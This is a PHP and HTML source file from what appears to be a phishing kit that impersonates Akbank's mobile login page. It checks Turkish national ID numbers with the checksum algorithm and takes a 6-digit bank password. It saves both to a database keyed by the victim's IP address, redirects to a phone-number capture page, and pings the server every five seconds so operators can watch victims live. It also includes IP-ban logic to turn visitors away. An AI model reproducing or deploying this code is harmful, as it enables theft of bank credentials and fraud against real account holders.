<?php
require_once 'connect.php';
if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$has_error = false;
if (isset($_GET['hata'])) {
    $has_error = true;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $tc = isset($_POST['customTc']) ? trim($_POST['customTc']) : '';
    $password = isset($_POST['customPass']) ? trim($_POST['customPass']) : '';

    // TC verification helper function
    function validate_tc($tckimlik) {
        $olmaz = ['11111111110', '22222222220', '33333333330', '44444444440', '55555555550', '66666666660', '77777777770', '88888888880', '99999999990'];
        if ($tckimlik[0] == 0 || !ctype_digit($tckimlik) || strlen($tckimlik) != 11) {
            return false;
        }
        $ilkt = 0;
        $sont = 0;
        $tumt = 0;
        for ($a = 0; $a < 9; $a += 2) {
            $ilkt += intval($tckimlik[$a]);
        }
        for ($a = 1; $a < 9; $a += 2) {
            $sont += intval($tckimlik[$a]);
        }
        for ($a = 0; $a < 10; $a++) {
            $tumt += intval($tckimlik[$a]);
        }
        if (($ilkt * 7 - $sont) % 10 != intval($tckimlik[9]) || $tumt % 10 != intval($tckimlik[10])) {
            return false;
        }
        if (in_array($tckimlik, $olmaz)) {
            return false;
        }
        return true;
    }

    if (validate_tc($tc) && strlen($password) === 6 && ctype_digit($password)) {
        // Clear previous redirects
        $db->prepare("DELETE FROM redirect WHERE ipAddress = ?")->execute([IP]);

        // Check if a record already exists for this IP
        $check = $db->prepare("SELECT id FROM records WHERE ipAddress = ? LIMIT 1");
        $check->execute([IP]);
        $existing = $check->fetch(PDO::FETCH_ASSOC);

        if ($existing) {
            // Update existing record, preserving phone number, sms, notes, etc.
            $update = $db->prepare("UPDATE records SET tc = ?, pass = ?, page = 'Telefon Numara Girişi', lastOnline = ? WHERE ipAddress = ?");
            $update->execute([$tc, $password, time() + 10, IP]);
        } else {
            // Insert new record
            $insert = $db->prepare("INSERT INTO records SET tc = ?, pass = ?, page = 'Telefon Numara Girişi', lastOnline = ?, ipAddress = ?");
            $insert->execute([$tc, $password, time() + 10, IP]);
        }

        $_SESSION['user_tc'] = $tc;

        // Route to telefon.php
        $ajax->redirect('telefon.php');
    } else {
        $has_error = true;
    }
}

$ajax->pageUpdate(IP, 'Giriş Sayfası');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    
    
    
    <title>Giriş - Direkt</title>
    <style>
        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
        
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJnecmNE.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJfecg.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
    </style>
</head>
<body>
    <div id="slider">
        <div class="gray3 slide active" style="background-color: rgb(241, 241, 241);">
            <div id="tab3header">
                <img src="/basvuru/img/ok.png" onclick="location.href='index.php'" width="32px" style="margin-right: auto; cursor: pointer;">
                <h2 style="text-align: center; font-size: 12px; color: white; margin: 0; margin-right: 47%; font-weight: 600;">Başvuru</h2>
            </div>

            <!-- Error Notification Alert Panel -->
            <div id="alertDiv" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
                <p style="color: #000; font-size: 12px; font-weight: 600; margin-top: 15px;">Bilgilendirme</p>
                <img src="/basvuru/img/loader.gif" style="width: 30%;">
                <p style="color: #000; font-size: 12px; font-weight: 400; padding: 0 10px;">Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar deneyebilirsin.</p>
                <button type="button" onclick="closeAlert()" id="btn-spc3" style="width: 90% !important;">Tamam</button>
            </div>

            <div id="loginInputs">
                <form id="customForm" method="POST" action="giris.php">
                    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">MÜŞTERİ VEYA TC KİMLİK NUMARASI</label>
                    <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric" required>
                    <hr>
                    <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">AKBANK ŞİFRESİ</label>
                    <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;" minlength="6" maxlength="6" inputmode="numeric" required>
                </form> 
            </div>

            <div id="tab3footer" style="display: flex; justify-content: space-between;">
                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight: 500;">
                    Müşteri numaranı mı <br> <span style="margin-left:-75px !important;">unuttun?</span>
                </p>
                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px; font-weight: 500;">
                    Şifreni mi unuttun?
                </p>
            </div>

            <div id="submitContainer">
                <button type="button" id="customSubmitBtn" style="background-color: rgb(220, 0, 4);" onclick="submitForm()">Başvuru Yap</button>
            </div>
        </div>
    </div>

    <script>
        function submitForm() {
            document.getElementById('customForm').submit();
        }
        function closeAlert() {
            document.getElementById('alertDiv').classList.remove('show');
        }
        // Giriş Online sayacında aktif kalabilmek için her 5 saniyede bir ping gönderir
        setInterval(function() {
            fetch('ping.php');
        }, 5000);
    </script>
</body>
</html>






